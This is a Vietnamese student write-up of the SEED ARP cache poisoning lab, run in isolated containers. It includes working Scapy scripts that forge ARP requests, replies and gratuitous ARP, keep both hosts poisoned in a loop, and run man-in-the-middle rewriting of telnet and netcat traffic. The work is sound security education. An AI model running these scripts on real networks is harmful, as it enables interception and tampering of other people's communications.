# ARP Cache Poisoning Attack Lab
- [ARP Cache Poisoning Attack Lab](#arp-cache-poisoning-attack-lab)
    - [Overview](#overview)
      - [a. ARP là gì?](#a-arp-là-gì)
      - [b. ARP cache poisoning attack là gì ?](#b-arp-cache-poisoning-attack-là-gì-)
      - [c. Mục tiêu của bài lab](#c-mục-tiêu-của-bài-lab)
    - [Setup Lab](#setup-lab)
    - [Task 1](#task-1)
    - [Task 2](#task-2)
    - [Task 3](#task-3)
### Overview 
#### a. ARP là gì?
ARP (Adress Resolution Protocol) được hiểu là là một phương thức phân giải địa chỉ động giữa địa chỉ lớp `Network` và `Data link`. Nó là một giao thức mạng được dùng để tìm ra địa chỉ MAC từ một địa chỉ IP nguồn.

>Để có thể tìm ra MAC từ IP thì thiết bị sẽ gửi một request ARP chứa IP thiết bị nhận đến tất cả các thiết bị `local network`. Tất cả các thiết bị trong `local network` sẽ tiếp nhận nhưng chỉ có một thiết bị có địa chỉ IP trùng với request sẽ phản hồi kèm theo địa địa chỉ MAC tương ứng.

Tiếp đến ta nói về cơ chế hoạt động của ARP. Khi một thiết bị mạng A có nhu cầu gửi một gói tin IP đi :
- Trước tiên nó sẽ kiểm tra xem địa chỉ IP đích của gói tin có nằm trong mạng local hay không. Nếu cùng nằm trong mạng local thì A sẽ thực hiện gửi gói trực tiếp đến đích.
- Nếu địa chỉ IP nằm trên một mạng khác thì A sẽ gửi gói tin đến cho một router để forward gói tin. 

#### b. ARP cache poisoning attack là gì ?

ARP về cơ bản là một quá trình có 2 chiều request/respone giữa các thiết bị trong mạng local. Nó là một giao thức khá đơn giản và nó không thực hiện bất gì biện pháp bảo mật nào. Đó là lý do mà attacker sẽ quan tâm và tạo ra nhiều cách khai thác.

ARP cache poisoning attack là một phương pháp tấn công khá phổ biến, vì ARP có lỗ hỏng đó là máy chủ mạng sẽ tự động lưu bất kỳ ARP reply nào mà chúng nhận được, bất kể máy khác có yêu cầu hay không, ngay cả ARP chưa hết hạn cũng sẽ bị ghi đè lên khi nhận được một gói ARP mới. Chính vì lỗ hỏng này attacker sẽ lợi dụng thực hiện giả mạo thông điệp ARP trong local network. Mục tiêu là kết hợp địa chỉ MAC của attacker với địa chỉ IP của một máy chủ khác. Làm cho tất cả các packet sẽ được gửi đến cho attacker. Từ đó attacker có thể chặn các packet và là bước đệm cho các cuộc tấn công tiếp đến.

#### c. Mục tiêu của bài lab 

- Cung cấp kiến thức về cách tấn công thông qua ARP request, ARP reply, ARP gratutous và thực hành.
- Sẽ thực hiện ARP cache poisoning attack làm tiền đề cho cuộc tấn công man-in-middle attack vào `telnet` và `netcat`.

### Setup Lab

Bạn có thể đọc https://seedsecuritylabs.org/Labs_20.04/Files/ARP_Attack/ARP_Attack.pdf phần 2 để thực hiện việc setup lab.
Sau đó ta cần phải kiểm tra địa chỉ IP và MAC của 3 container để phục vụ cho các task.

| Tên                     | IP         | MAC               |
| ----------------------- | ---------- | ----------------- |
| M-10.9.0.105 (attacker) | 10.9.0.105 | 02:42:0a:09:00:69 |
| A-10.9.0.5              | 10.9.0.5   | 02:42:0a:09:00:05 |
| B-10.9.0.6              | 10.9.0.6   | 02:42:0a:09:00:06 |

### Task 1 
**1. Task 1A** : Đề yêu cầu xây dựng 1 ARP request để có thể ánh xạ địa chỉ IP của B với địa chỉ MAC của attacker và gửi đến A và kiểm tra kết quả.



Dựa vào hướng dẫn có trong file hướng dẫn thì ta có thể hiểu được cách tạo ra một packet ARP dùng Scapy. Bây giờ để có thể ánh xạ địa chỉ IP của B với địa chỉ MAC của attacker thì ta chỉ việc thay đổi giá trị của các trường sau :

>`hwsrc, psrc` : MAC nguồn, IP nguồn
>`hwdst, pdst` : MAC đích, IP đích

Tiếp đó cần thực hiện gán địa chỉ MAC của attacker vào địa chỉ IP của B bằng việc sử dụng MAC nguồn và IP nguồn, sau đó gửi đến cho ARP cache của A bằng MAC đích và IP đích.
Cụ thể đoạn code dưới sẽ làm việc đó :

```python=
#!/usr/bin/python3
from scapy.all import *

E = Ether()
A = ARP(op=1,hwsrc='02:42:0a:09:00:69',psrc='10.9.0.6',hwdst='02:42:0a:09:00:05', pdst='10.9.0.5')
pkt = E/A
pkt.show()
sendp(pkt)
```
Bây giờ ta bắt đầu thực hiện :
- Đầu tiên ta thực hiện kiểm tra ARP cache ở hai Host A và Host B bằng lệnh `arp` nhưng không nhận được gì vì bây giờ chưa có ARP request nào cả nên cache hiện tại đang trống.
- Tiếp đến ta thực thiện `tcpdump -i eth0 -n` để có thể kiểm tra traffic tại interface `eth0` 
- Qua terminal attacker thực hiện đoạn code trên 

    ![](https://i.imgur.com/SSOVDri.png)

    Ta nhận được kết quả đã gửi thành công packet với MAC nguồn là của attacker và IP nguồn là của host B 

- Quay lại terminal Host A ta thấy có các ARP request và ARP reply

![](https://i.imgur.com/VzsY2yI.png)

- Còn ở terminal Host B thì lại chỉ có ARP request 

![](https://i.imgur.com/G9qU5fF.png)

> Tại vì ARP reply chỉ thực hiện ở máy có địa chỉ IP phù hợp với địa chỉ IP đích trong gói tin 

- Bây giờ ta kiểm tra lại ARP cache tại terminal Host A thì thấy địa chỉ MAC của B bây giờ đã trở thành địa chỉ MAC của attacker. 

![](https://i.imgur.com/3sctXdw.png)

Vậy là chúng ta đã thành công trong cuộc tấn công ARP cache bằng APR request .

**2. Task 1B** : Đề yêu cầu xây dựng ARP reply có thể ánh xạ địa chỉ MAC của attacker với địa chỉ IP của Host B. Sau đó gửi đến A và kiểm tra kết quả. 

- IP của B đã có trong ARP cache của A :
    - Đầu tiên ta ta thực hiện một đoạn code ARP request tương tự như trên với địa chỉ IP nguồn và MAC nguồn là của B và gửi đến A để cho ARP cache lưu trữ thông tin.
    
    ```python=
    #!/usr/bin/python3
    from scapy.all import *

    E = Ether(src = '02:42:0a:09:00:69', dst = '02:42:0a:09:00:05')

    A = ARP(op=1, hwsrc='02:42:0a:09:00:06',psrc='10.9.0.6',hwdst='02:42:0a:09:00:05', pdst='10.9.0.5')

    pkt = E/A
    pkt.show()
    sendp(pkt)
    ```
    
    -   Bây giờ kiểm tra lại ARP cache ta thấy địa chỉ IP và MAC của B được lưu là chính xác 
    
    ![](https://i.imgur.com/7X7f8ZR.png)

    -Tiếp đến ta thực hiện gửi một ARP reply từ terminal attacker với thông tin MAC của attacker gán với địa chỉ của Host B với đoạn code như sau 
    
    ```python=
    #!/usr/bin/python3
    from scapy.all import *

    E = Ether(src = '02:42:0a:09:00:69',dst = '02:42:0a:09:00:05')
    A = ARP(op=2 ,hwsrc='02:42:0a:09:00:69',psrc='10.9.0.6',hwdst='02:42:0a:09:00:05', pdst='10.9.0.5')
    pkt = E/A
    pkt.show()
    sendp(pkt)
    ```
    Ta thấy đã thực hiện gửi đi thành công.
    
    ![](https://i.imgur.com/NTHoEg3.png)

    
    - Phía terminal A thì thực hiện lệnh `tcpdump -i eth0 -n` để kiểm tra traffic thì thấy có một ARP reply với IP của Host B và MAC thì của attacker.
    
    ![](https://i.imgur.com/7csMNJz.png)

    - Bây giờ ta kiểm tra ARP cache của A thì thấy địa chỉ MAC của B đã thay đổi thành địa chỉ MAC của A

    ![](https://i.imgur.com/N8Pn8Os.png)

Vậy là ta đã thực hiện ARP cache poison attack thành công.

- IP của B chưa có trong ARP cache của A

    - Tiếp đến là trường hợp này thì cần phải xóa thông tin Host B trong ARP cache bằng lệnh `arp -d 10.9.0.6` 
    - Tương tự các bước ở trên, bây giờ ta thực hiện code ở terminal attacker để gửi đi một ARP reply và thực hiện kiểm tra bên terminal Host A

    ![](https://i.imgur.com/zo4kSR0.png)
    
    Đã gửi thành công.
    
    ![](https://i.imgur.com/DBaV5nV.png)
    
    Thực hiện `tcpdump -i eth0 -n` cũng thấy được có một ARP reply gửi đến với nội dung là IP của B và MAC của attacker như ở trường hợp trước nhưng kiểm tra ARP cache thì thấy vẫn trống.
    
Có thể thấy chúng ta không thể thực hiện thành công ARP cache poison attack trong trường hợp này.

**3. Task 1C** : Đề yêu cầu xây dựng một ARP gratuitous để ánh xạ địa chỉ IP Host B với địa chỉ MAC của attacker 

Ta có ARP gratuitous là một dạng đặc biệt của ARP request dùng khi cần update các thông tin ARP cache từ tất cả các máy khác với đặc điểm là địa chỉ IP nguồn và IP đích giống nhau, địa chỉ MAC đích là broadcast và không cần ARP reply. 

- IP của B có trong ARP cache của A :

    - Thực hiện giống task 1B ở trên để ARP cache của A có thông tin của Host B 

    ![](https://i.imgur.com/ciUN5yc.png)

    - Bây giờ chúng ta sẽ thực hiện đoạn code ARP gratuitous với các đặc điểm kể trên như sau:

    ```python=
    #!/usr/bin/python3
    from scapy.all import *

    E = Ether( src = '02:42:0a:09:00:69', dst = 'ff:ff:ff:ff:ff:ff')
    A = ARP(hwsrc='02:42:0a:09:00:69',psrc='10.9.0.6',hwdst='ff:ff:ff:ff:ff:ff', pdst='10.9.0.6')
    pkt = E/A
    pkt.show()
    sendp(pkt)
    ```
    Ta thấy đã thực hiện gửi đi thành công.
    
    ![](https://i.imgur.com/2fFvlmH.png)

    - Phía terminal A thực hiện lệnh `tcpdump -i eth0 -n` để kiểm tra traffic thì thấy có một ARP reply với IP của Host B và địa chỉ MAC của attacker và khi chúng ta kiểm tra ARP cache thì thấy địa chỉ MAC của Host B đã thay dổi thành địa chỉ MAC của attacker.

    ![](https://i.imgur.com/WVNN6Dn.png)

Vậy là ta đã thực hiện ARP cache poison attack thành công.
    
- IP của B chưa có trong ARP cache của A:

    - Đầu tiên ta thực hiện `arp -d 10.9.0.6` để xóa đi thông tin Host B trong ARP cache của A
    - Và tiếp theo thực hiện giống ở trên, lần lượt là thực thi code ở terminal attacker và kiểm tra ở Host A

    Đã gửi thành công ở terminal attacker.
    
    ![](https://i.imgur.com/cuZBt0I.png)

    Kiểm tra Host A thì thấy traffc có một ARP reply với địa chỉ IP của Host B và địa chỉ MAC của attacker nhưng khi kiểm tra ARP cache thì vẫn còn trống.

    ![](https://i.imgur.com/bmNWbpT.png)

Vậy trong trường hợp này ta không thực hiện thành công được ARP cache poison attack.

>**Vậy thông qua hai Task 1B và Task 1C thì ta có thể kế luận rằng để có thể thực hiện được ARP cache poison attack bằng ARP reply hoặc ARP gratutous thì trong ARP cache phải tồn tại từ trước đó thì mới có thể ghi đè địa chỉ MAC lên được.**


### Task 2 

Ở task này đề yêu cầu chúng ta thực hiện MITM attack vào telnet bằng ARP cache poison. 
A và B sẽ giao tiếp với nhau bằng telnet. Mục tiêu của attacker sẽ là ngăn chặn lại và thay đổi thông điệp giữa A và B.

- Step 1: Thực hiện ARP attack bằng ARP request trên cả Host A và Host B. Với ARP cache của A thì sẽ lưu thông tin IP của B gán với MAC của attacker còn với ARP cache của B thì sẽ lưu thông tin của IP của A gán với MAC của attacker. Thực hiện lặp lại việc gửi ARP request đó mỗi 5 giây. Cụ thể ta sẽ thực hiện đoạn code như sau : 

    ```python=
    #!/usr/bin/python3
    from time import sleep
    from scapy.all import *

    while True :

        E = Ether(src = '02:42:0a:09:00:69',dst = '02:42:0a:09:00:05')
        A = ARP(hwsrc='02:42:0a:09:00:69',psrc='10.9.0.6',hwdst='02:42:0a:09:00:05', pdst='10.9.0.5')
        pkt = E/A
        pkt.show()
        sendp(pkt)

        E = Ether(src = '02:42:0a:09:00:69',dst = '02:42:0a:09:00:06')
        A = ARP(hwsrc='02:42:0a:09:00:69',psrc='10.9.0.5',hwdst='02:42:0a:09:00:06', pdst='10.9.0.6')
        pkt = E/A
        pkt.show()
        sendp(pkt)

        time.sleep(5)

    ```

    Đã thực hiện gửi thành công ARP request đến cho cả Host A và Host B

    ![](https://i.imgur.com/eT5mMHt.png)

    Bây giờ ta thực hiện kiểm tra ARP cache của Host A 

    ![](https://i.imgur.com/JyihfZr.png)

    Kiểm tra tiếp đến ARP cache Host B 

    ![](https://i.imgur.com/Chqbs80.png)

>Vậy là thấy kết quả đã đúng với yêu cầu của step 1

- Step 2 : Thực hiện tắt đi tính năng `ip_forward` và ping qua lại giữa hai máy A và B.

    - Thực hiện tắt tính năng `ip_forward` theo yêu cầu
    
    ![](https://i.imgur.com/X9nmufc.png)

    - Thực hiện ping từ Host A đến Host B

    ![](https://i.imgur.com/7yCmMJW.png)

    - Thực hiện lệnh `tcpdump -i any -n` để kiểm tra traffic thì thấy gói tin chỉ được gửi từ Host A đến Host B nhưng không có bất cứ sự phản hồi nào đến từ Host B .

    ![](https://i.imgur.com/um5zjQ7.png)
    
    - Tương tự, ta thực hiện ping từ Host B sang Host A

    ![](https://i.imgur.com/iNFMcFf.png)

    - Thực hiện lệnh `tcpdump -i any -n` để kiểm tra traffic thì thấy gói tin chỉ được gửi từ Host B đến Host A nhưng không có bất cứ sự phản hồi nào đến từ Host A .

    ![](https://i.imgur.com/Yiil5SJ.png)

> Có thể thấy thì khi thực hiện ping qua lại giữa hai Host A và Host B thì gói tin chỉ được gửi mà không được phản hồi từ đối phương vì cơ bản gói tin được gửi đến attacker nhưng attacker lại tắt tính năng `ip_forward` để forwarding gói tin nên gói tin sẽ bị drop và không đến được đối phương do đó không có phản hồi.

- Step 3 : Ở bước này chúng ta thực hiện tương tự như step 2 nhưng bật tính năng `ip_forward` 

    - Thực hiện bật tính năng `ip_forward` lên

    ![](https://i.imgur.com/NAMbWk0.png)

    - Thực hiện ping từ Host A tới Host B để kiểm tra

    ![](https://i.imgur.com/ZvJVIJO.png)

    - Thực hiện lệnh `tcpdump -i any -n` để kiểm tra traffic 

    ![](https://i.imgur.com/4mUvTRo.png)
    - Thực hiện ping từ Host B đến Host A thì kết quả tương tự như trên.
> Có thể thấy gói tin được gửi từ A đến B thì sẽ có sự phản hồi từ B. và gói tin gửi từ B đến A thì cũng có sự phản hồi từ A. Trong khi đó thì attacker là người đứng giữa để chuyển hướng các gói tin với chức năng như một router. Đây chính là điều mà chúng ta cần lưu ý khi thực hiện MITM attack.

- Step 4: Khởi động MITM attack. Mục đích của task này đó là thay đổi data telnet giữa A và B. Giả sử A là client và kết nối đến B là server, khi A gõ bất cứ từ gì thì cũng sẽ tạo ra một gói TCP với nội dung là từ vừa gõ và gửi đến cho B. Bây giờ attacker sẽ ngăn chặn data lại và sửa data đó thành chữ Z. Bằng cách này thì dù A có gõ gì đi chăng nữa màn hình vẫn sẽ chỉ hiện Z mà thôi.

    - Yêu cầu đầu tiên đó là kết nối telnet giữa A và B ở mode `ip_forward = 1` sau khi kết nối xong thì chuyển mode `ip_forward = 0`, gõ vài từ ở phía terminal A và cho kết quả.
        - Đầu tiên ta kết nối telnet giữa A và B ở mode `ip_forward=1`

        ![](https://i.imgur.com/xZoaj0B.png)

        - Tiếp đến ta chuyển mode `ip_forward=0` thì kết nối telnet sẽ bị attacker chặn lại ở giữa, bây giờ dù ta có gõ gì thì màn hình vẫn sẽ không xuất hiện gì. Vì khi `ip_forward=0` tức là tắt tính năng forwarding nên sẽ không nhận được gói tin phản hồi. Cho đến khi ta chuyển `ip_forward=1` thì những gì ta vừa gõ lúc trước sẽ xuất hiện hoặc chờ attacker tạo ra một gói tin phản hồi.
    - Yêu cầu tiếp theo, thực hiện chương trình sniff&spoof ở phía attacker để bắt các gói tin gửi từ A đến B và thay đổi thông tin. Còn gói tin phản hồi từ B về A sẽ giữ nguyên. 
    Đề bài đã cho sẵn chúng ta sườn code sniff&spoof, bây giờ chúng ta chỉ việc thực hiện thay đổi data từ A đến B và filter một cách phù hợp để nó không ảnh hưởng đến hiệu suất nữa là mọi việc được giải quyết. Cụ thể code sẽ thực hiện như sau :

    ```python=
    #!/usr/bin/env python3
    from scapy.all import *

    IP_A = "10.9.0.5"
    MAC_A = "02:42:0a:09:00:05"

    IP_B = "10.9.0.6"
    MAC_B = "02:42:0a:09:00:06"

    IP_M = "10.9.0.105"
    MAC_M = "02:42:0a:09:00:69"

    print("Start MITM attack ...")

    def spoof_pkt(pkt):
        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B: 
             newpkt = IP(bytes(pkt[IP]))
             del(newpkt.chksum)
             del(newpkt[TCP].payload)
             del(newpkt[TCP].chksum)

             if pkt[TCP].payload:
                data = pkt[TCP].payload.load
                print("data : ",data, "length : ",len(data))
                # Nếu bạn chỉ muốn thay thế các các ký tự từ a->z , từ A->Z và các số từ 0-9
                newdata = re.sub('[0-9a-zA-Z]', 'Z', data.decode())
                # Nếu bạn muốn tất cả các phím nhập vào đều được thay đổi thành Z 
                # newdata = 'Z'*len(data)
                send(newpkt/newdata)
             else: 
                 send(newpkt)

        elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
             newpkt = IP(bytes(pkt[IP]))
             del(newpkt.chksum)
             del(newpkt[TCP].chksum)
             send(newpkt)

    f = 'tcp and (ether src 02:42:0a:09:00:05 or ether src 02:42:0a:09:00:06)'   
    pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)

    ```

    - Bây giờ ta thực hiện chạy code ở terminal attacker với chế độ `forwarding=0` tiếp đó qua terminal A gõ vài ký tự và kiểm tra thấy 

    ![](https://i.imgur.com/ZlBazdx.png)

    Thông tin data ta gõ vào có giá trị lần lượt là `abc` nhưng kết quả ta nhân được ở màn hình terminal Host A là `ZZZ`. 
    >Vì khi gói tin chứa data `abc` đi thì bị attacker bắt lại và đổi data thành `ZZZ` và gửi đến Host B (server). Server sẽ gửi lại gói tin với data giống vậy là `ZZZ` và attacker sẽ không làm gì gói tin từ B về A nên kết quả cuối cùng hiển thị lên màn hình là `ZZZ`
    
    ![](https://i.imgur.com/dzF3Lgh.png)

> **Vậy là chúng ta đã thành công trong việc thực hiện MITM attack vào telnet bằng ARP cache poison**.


### Task 3

Đề bài ở task này tương tự như task 2. Nhưng thay vì thực hiện MITM attack vào telnet thì ở task này chúng ta sẽ thực hiện MITM attack vào netcat bằng ARP cache poison.

- Đầu tiên chúng ta cũng cần thực hiện ARP poison attack với Host A và Host B tương tự như task 2

    - Thực hiện chương trình đã đề cập đến ở task 2 ở terminal attacker để cứ sau mỗi 5s thì sẽ gửi ARP request đến cho Host A và Host B để thực hiện ARP cache poison attack.

    ![](https://i.imgur.com/G1y2Jl7.png)

    - Sau đó kiểm tra ARP cache của Host A

    ![](https://i.imgur.com/I1s3II7.png)

    - Tiếp đến kiểm tra ARP cache của Host B

    ![](https://i.imgur.com/tih3rBK.png)

> Vậy là đã xong bước đầu đó chính là gán địa chỉ IP của A cho địa chỉ MAC attacker trong ARP cache của B và gán địa chỉ IP của B cho địa chỉ MAC attacker trong ARP cache của A.



- Tiếp đến ta để chế độ `ip_forward=1` thì khi nhập một đoạn chat và nhấn `ENTER` thì phía bên còn lại sẽ hiển thị 
    - ví dụ : 
        Ta gõ chat ở phía terminal A (client) như sau

        ![](https://i.imgur.com/XD4l5Kq.png)
        
        Sau khi nhấn `ENTER` thì phía terminal B (server) sẽ hiển thị giống hệt vậy.
        
        ![](https://i.imgur.com/qjZ2pnC.png)

        Tương tự nếu bạn gõ ở phía terminal B và nhấn `ENTER` thì phía A cũng sẽ hiển thị giống hệt vậy.
        
- Bây giờ ta chuyển sang chết độ `ip_forward=0` thì khi nhập và nhấn `ENTER` thì sẽ không có gì xuất hiện ở phía bên kia vì đã tắt tính năng forwarding nên sẽ không có gói tin nào được gửi đến server trừ khi attacker tạo một gói tin gửi đi hoặc bật tính năng forwarding.

- Tiếp theo ta sẽ thực hiện MITM attack vào netcat thay đổi nội dung xuất hiện nếu là tên mình thì sẽ thay đổi thành một chuỗi `A` tương ứng với độ dài, ta sẽ thực hiện bằng đoạn code như sau :

    ```python=
    #!/usr/bin/env python3
    from scapy.all import *

    IP_A = "10.9.0.5"
    MAC_A = "02:42:0a:09:00:05"

    IP_B = "10.9.0.6"
    MAC_B = "02:42:0a:09:00:06"

    IP_M = "10.9.0.105"
    MAC_M = "02:42:0a:09:00:69"

    print("START MITM ATTACK.........")

    def spoof_pkt(pkt):
        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B: 
             newpkt = IP(bytes(pkt[IP]))
             del(newpkt.chksum)
             del(newpkt[TCP].payload)
             del(newpkt[TCP].chksum)

             if pkt[TCP].payload:
                data = pkt[TCP].payload.load
                print("data : ",data, "length : ",len(data))
                data = data.decode()
                myName = 'hao'
                newdata = re.sub(myName,'A'*len(myName),data,flags=re.IGNORECASE) if myName in data else data
                newdata = newdata.encode()
                send(newpkt/newdata)
             else: 
                send(newpkt)

        elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
             newpkt = IP(bytes(pkt[IP]))
             del(newpkt.chksum)
             del(newpkt[TCP].chksum)
             send(newpkt)

    f = 'tcp and (ether src 02:42:0a:09:00:05 or ether src 02:42:0a:09:00:06)'    
    pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)


    ```
    
- Bây giờ ta thực hiện `nc -lvnp 9090` ở terminal Host B để lắng nghe và dùng lệnh `nc -nv 10.9.0.6 9090` ở terminal A để kết nối đến B và gõ một số thông điệp :

    - Ở terminal A khi kết nối đến và gửi thông điệp :

    ![](https://i.imgur.com/vT3jSEN.png)
    
    - Ở terminal B mở kết nối và nhận thông điệp :
    
    ![](https://i.imgur.com/NCF0rNF.png)

- Bây giờ ta thực hiện chuyển mode `ip_forward=0` để tắt tính năng forwarding và chạy đoạn code python trên để bắt đầu MITM attack vào netcat với nhiệm vụ sẽ thay đổi tên thành chuỗi `A` với độ dài phù hợp

    ![](https://i.imgur.com/UX6DyYL.png)

- Có thể thấy sau khi thực hiện MITM attack thì thông điệp chứa tên đã bị thay đổi 
    - Ở terminal A khi gõ thông điệp có tên Hao :
    
    ![](https://i.imgur.com/zrt0wtV.png)

    - Nhưng ở terminal B khi nhận thông điệp có tên Hao thì lại bị chuyển đổi thành một chuỗi `A` với độ dài tương ứng:
    
    ![](https://i.imgur.com/zyMLNTK.png)
    
    - Ngược lại nếu ở terminal B gửi thông điệp có chứa tên `hao` thì sẽ không bị thay đổi gì khi đến bên A
    
    >Vì Khi Host A gửi thông điệp đến Host B thì bị attacker chặn lại và kiểm tra, nếu có tên `hao` không phân biệt hoa thường đều sẽ đổi thành một chuỗi `A` với độ dài tương ứng sau đó thì gửi đi cho Host B để hiển thị. Còn khi Host B gửi thông điệp thì dù là attacker có chặn lại nhưng sẽ không thực hiện việc gì cả và gửi về cho A để hiển thị nên sẽ không thay đổi gì so với thông điệp gốc.

> **Vậy là ta đã thực hiện thành công MITM attack vào netcat bằng ARP cache poison**

